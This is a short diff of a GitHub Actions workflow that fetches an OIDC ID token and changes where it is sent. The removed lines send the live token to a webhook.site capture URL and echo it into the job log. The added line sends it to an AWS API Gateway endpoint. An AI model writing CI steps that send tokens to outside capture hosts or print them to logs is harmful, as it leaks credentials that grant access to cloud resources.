@@ -19,8 +19,8 @@ jobs:
               shell: bash
               run: |
                 idtoken=$(curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://rhel-issuer" | python3 -c 'import json; import sys; print(json.loads(sys.stdin.read())["value"])')
-                curl -H "Authorization: $idtoken" https://webhook.site/f5b7a50c-3fe4-41e2-8b49-aeea220fcadd
-                echo "ID Token: $idtoken"
+                result=$(curl --fail -H "Authorization: Bearer $idtoken" https://8yblh00n16.execute-api.us-east-2.amazonaws.com)
+                echo "Result: $result"
 
             - name: Mask secrets
               shell: bash
